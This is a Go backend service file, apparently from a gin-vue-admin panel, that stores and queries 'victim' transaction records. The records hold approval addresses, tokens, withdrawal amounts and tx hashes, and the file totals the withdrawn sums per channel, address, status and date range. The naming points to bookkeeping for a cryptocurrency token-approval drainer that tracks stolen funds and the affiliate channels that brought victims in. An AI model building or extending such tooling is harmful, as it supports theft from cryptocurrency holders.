package system

import (
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/request"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	"strconv"
	"time"
)

//@author: [piexlmax](https://github.com/piexlmax)
//@function: CreateVictimTx
//@description: 新增基础tx
//@param: tx model.SysVictimTx
//@return: err error

type VictimTxService struct{}

func (VictimTxService *VictimTxService) CreateVictimTx(tx system.SysVictimTx) (err error) {

	return global.GVA_DB.Create(&tx).Error
}

func (VictimTxService *VictimTxService) GetVictimTxById(id int) (tx system.SysVictimTx, err error) {
	err = global.GVA_DB.Where("id = ?", id).First(&tx).Error
	return
}

//@author: [piexlmax](https://github.com/piexlmax)
//@function: GetAPIInfoList
//@description: 分页获取数据,
//@param: victim model.SysVictim, info request.PageInfo, order string, desc bool
//@return: list interface{}, total int64, err error

func (VictimService *VictimTxService) GetVictimTxInfoList(victim system.SysVictimTx, info request.PageInfo, order string, desc bool, startDateStr string, endDateStr string, channel string) (amount float64, list interface{}, total int64, err error) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Model(&system.SysVictimTx{})
	var victimList []system.SysVictimTx

	if channel != "" {
		db = db.Where("Primary_Channel = ?", channel)
	}

	if victim.ApprovalAddress != "" {
		db = db.Where("Approval_Address = ?", victim.ApprovalAddress)
	}

	if victim.Token != "" {
		db = db.Where("token = ?", victim.Token)
	}

	if len(startDateStr) > 0 && len(endDateStr) > 0 {

		startDate, error := time.Parse("2006-01-02", startDateStr)
		endDate, error := time.Parse("2006-01-02", endDateStr)
		if error == nil {
			db = db.Where("created_at BETWEEN ? AND ?", startDate, endDate)
		}
	}

	err = db.Count(&total).Error
	var totalAmount float64
	if err != nil {
		return 0, victimList, total, err
	} else {
		db = db.Limit(limit).Offset(offset)
		if order != "" {
			var OrderStr string
			// 设置有效排序key 防止sql注入
			// 感谢 Tom4t0 提交漏洞信息
			orderMap := make(map[string]bool, 10)
			orderMap["id"] = true
			orderMap["withdraw_amount"] = true
			orderMap["status"] = true
			orderMap["from_address"] = true
			orderMap["approval_address"] = true
			orderMap["token"] = true
			orderMap["to_address"] = true
			orderMap["tx_Hash"] = true
			orderMap["primary_channel"] = true
			orderMap["secondary_channel"] = true
			if orderMap[order] {
				if desc {
					OrderStr = order + " desc"
				} else {
					OrderStr = order
				}
			} else { // didn't match any order key in `orderMap`
				err = fmt.Errorf("非法的排序字段: %v", order)
				if err == nil {
					for _, record := range victimList {
						amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
						if err == nil {
							totalAmount = totalAmount + amount
						}
					}
				}

				return totalAmount, victimList, total, err
			}

			err = db.Order(OrderStr).Find(&victimList).Error
		} else {
			err = db.Order("id desc").Find(&victimList).Error
		}
	}

	if err == nil {
		for _, record := range victimList {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}

	return totalAmount, victimList, total, err
}

func (VictimTxService *VictimTxService) UpdateVictimTxRefresh(tx system.SysVictimTx) (err error) {
	err = global.GVA_DB.Model(&system.SysVictimTx{}).Where("id = ?", tx.ID).Update("refresh", tx.Refresh).Error
	return err
}

func (VictimTxService *VictimTxService) UpdateVictimTx(tx system.SysVictimTx) (err error) {
	var oldA system.SysVictimTx
	err = global.GVA_DB.Where("id = ?", tx.ID).First(&oldA).Error
	if err != nil {
		return err
	} else {

		err = global.GVA_DB.Save(&tx).Error
	}

	return err
}
func (VictimTxService *VictimTxService) QueryUniqueChannel() ([]string, error) {
	var records []string
	err := global.GVA_DB.Model(&system.SysVictim{}).Distinct("primary_channel").Where("status = ?", 1).Find(&records).Error
	return records, err
}
func (VictimTxService *VictimTxService) QueryUniqueAddress() ([]string, error) {
	var records []string
	err := global.GVA_DB.Model(&system.SysVictim{}).Distinct("Approval_Address").Where("status = ?", 1).Find(&records).Error
	return records, err
}

func (VictimTxService *VictimTxService) StatByApprovalAddress(tx string) (float64, error) {
	var recordTxs []system.SysVictim
	err := global.GVA_DB.Model(&system.SysVictim{}).Where("Approval_Address = ?", tx).Find(&recordTxs).Error
	var totalAmount float64
	if err != nil {
		return totalAmount, err
	} else {

		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}
	return totalAmount, err
}
func (VictimTxService *VictimTxService) StatByChannel(txChannel string) (float64, error) {
	var recordTxs []system.SysVictim
	err := global.GVA_DB.Model(&system.SysVictim{}).Where("primary_channel = ?", txChannel).Find(&recordTxs).Error
	var totalAmount float64
	if err != nil {
		return totalAmount, err
	} else {

		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}
	return totalAmount, err
}

func (VictimTxService *VictimTxService) StatByChannelAndDate(txChannel string, startDateStr string, endDateStr string) (float64, error) {
	var recordTxs []system.SysVictimTx
	db := global.GVA_DB.Model(&system.SysVictimTx{})
	if len(startDateStr) > 0 && len(endDateStr) > 0 {
		startDate, error := time.Parse("2006-01-02", startDateStr)
		endDate, error := time.Parse("2006-01-02", endDateStr)
		if error == nil {
			db = db.Where("created_at BETWEEN ? AND ?", startDate, endDate)
		}
	}
	err := db.Where("primary_channel = ?", txChannel).Find(&recordTxs).Error
	var totalAmount float64
	if err != nil {
		return totalAmount, err
	} else {
		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}
	return totalAmount, err
}

func (VictimTxService *VictimTxService) StatByStatus(_status uint, channel string, startDateStr string, endDateStr string) (int, float64, error) {
	var recordTxs []system.SysVictimTx
	var err error
	db := global.GVA_DB.Model(&system.SysVictimTx{})

	if len(startDateStr) > 0 && len(endDateStr) > 0 {

		startDate, error := time.Parse("2006-01-02", startDateStr)
		endDate, error := time.Parse("2006-01-02", endDateStr)
		if error == nil {
			db = db.Where("created_at BETWEEN ? AND ?", startDate, endDate)
		}
	}

	if channel != "" {
		err = db.Where("status = ? and primary_channel = ?", _status, channel).Find(&recordTxs).Error
	} else {
		err = db.Where("status  = ?", _status).Find(&recordTxs).Error
	}

	var totalAmount float64
	if err != nil {
		return 0, totalAmount, err
	} else {
		for _, record := range recordTxs {
			amount, err := strconv.ParseFloat(record.WithdrawAmount, 64)
			if err == nil {
				totalAmount = totalAmount + amount
			}
		}
	}

	return len(recordTxs), totalAmount, err
}
